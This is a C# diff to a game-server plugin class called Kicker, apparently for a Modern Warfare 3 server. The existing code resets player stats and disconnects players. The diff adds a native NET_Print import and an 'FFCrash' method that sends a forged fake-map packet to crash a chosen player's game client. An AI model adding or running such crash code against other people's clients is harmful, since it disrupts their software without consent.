@@ -6,11 +6,15 @@
 // License: GNU GPL v3.0
 // ========================================================
 using InfinityScript;
+using System.Runtime.InteropServices;
 
 namespace ExtensionScript
 {
     public class Kicker
     {
+        [DllImport("RemoveTeknoChecks.dll", CallingConvention = CallingConvention.Cdecl)]
+        public static extern int NET_Print(int b, int entRef, [MarshalAs(UnmanagedType.LPStr)] string message);
+
         /// <summary>function <c>Reset</c> Resets the stats of the player.</summary>
         public void Reset(Entity player)
         {
@@ -57,5 +61,13 @@ namespace ExtensionScript
             player.SetPlayerData("persistentWeaponsUnlocked", "iw5_m60jugg", 1);
             Utilities.ExecuteCommand($"dropclient {player.EntRef} \"\"");
         }
+
+
+        /// <summary>
+        /// Uses a native function to trick the client into loading a fake map with a fake gamemode. Duplicate packets is a parameter because we are using UDP protocol
+        /// </summary>
+        /// <param name="player">Player</param>
+        /// <param name="duplicatePackets">duplicatePackets</param>
+        public void FFCrash(Entity player, int duplicatePackets) => NET_Print(duplicatePackets, player.EntRef, "loadingnewmap\n mp_favela \ncum");
     }
 }
